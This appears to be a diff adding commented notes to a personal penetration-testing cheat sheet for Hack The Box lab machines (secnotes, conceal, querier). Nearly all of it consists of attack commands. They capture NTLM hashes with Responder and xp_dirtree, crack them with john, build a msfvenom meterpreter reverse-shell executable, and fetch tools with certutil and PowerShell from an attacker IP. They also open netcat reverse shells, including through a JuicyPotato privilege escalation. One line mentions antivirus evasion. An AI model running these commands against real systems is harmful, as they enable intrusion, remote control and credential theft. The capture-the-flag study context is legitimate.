@@ -24,6 +24,96 @@
 ## got the administrator password. Get the root shell
 ## ./psexec.py administrator@active.htb
 
+##smbclient //secnotes.htb/new-site -U "tyler"
+
+## Grep in windowss
+## dir *.exe /b/s | findstr bash
+
+## Sqli in sqlserver. use xpdirtree to contact smb and get the creds
+
+## responder -I tun0 ==> run the responder to steal ntlm hashes
+## xpdirtree : 1; EXEC MASTER.sys.xp_dirtree '\\10.10.xx.xx\fakeshare'
+
+## Get the hash and crack it using john
+##./john stacy.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+## exe format payload using msfvenom
+## msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.xx.xx LPORT=1337 -f exe > taskkill.exe
+
+## Download the file using powershell
+## Invoke-WebRequest -o taskkill.exe http://10.10.xx.xx/taskkill.exe 
+
+## Stop and start service using powershell
+## Stop-Service "Ubiquiti UniFi Video
+## Start-Service "Ubiquiti UniFi Video"
+
+## encode the msfvenom payload using phantom evasion for AV bypass
+
+## Read the MS access database mdb file
+## mdb-tables backup.mdb
+
+## read the tables from the db dump
+## mdb-export backup.mdb auth_user
+
+## Read the mail pst files
+## readpst Access\ Control.pst
+
+## c:/users ==> home dir in windows. subdirs are administrator and users on the system
+
+## type somefile.lnk
+
+## runas
+## runas /user:Administrator /savecred "nc.exe -c cmd.exe 10.10.xx.xx 1337
+
+## Download the file using cert-util
+## certutil -urlcache -split -f http://10.10.xx.xx/nc.exe nc.exe 
+
+## UDP on windows
+## nmap -vvv -sU -o nmapudp conceal.htb --max-retries 0
+
+## snmpwalk
+## snmpwalk -c public -v 1 conceal.htb
+
+## use crackstation for cracking
+
+## enumerate the ike vpn service
+## ike-scan hostname
+
+## check privileges
+## whoami /priv
+
+## SeImpersonatePrivilege can lead to juicy potato priv esc
+## certutil -urlcache -split -f http://10.10.xx.xx/juicypotato.exe juicypotato.exe
+## certutil -urlcache -split -f http://10.10.xx.xx/nc.exe nc.exe 
+## echo C:\users\Destitute\appdata\local\temp\nc.exe -e cmd.exe 10.10.xx.xx 1340 > rev.bat
+## juicypotato.exe -p C:\users\Destitute\appdata\local\temp\rev.bat -l 1340 -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
+
+
+## list the smb shares
+##smbclient --list //querier.htb/ -U ""
+
+## Anononymous access
+## smbclient //querier.htb/Reports/ -U ""
+
+## use olevba for excel analysis
+## olevba Currency\ Volume\ Report.xlsm
+
+## connect mssql server with impacket with the creds
+## mssqlclient.py reporting@querier.htb -db volume 
+## mssqlclient.py reporting@querier.htb -db volume -windows-auth
+
+## in the Sql shell through impacket
+## enable_xp_cmdshell ==> check we have permission to enable
+## responder -I tun0 
+## EXEC MASTER.sys.xp_dirtree '\\10.10.xx.xx\fakeshare'
+
+## crack the ntlm v2 hash using john
+
+## john --wordlist=/usr/share/wordlists/rockyou.txt mssql-svc.hash
+
+## Now enable xp-cmdshell
+
+
 
 
 
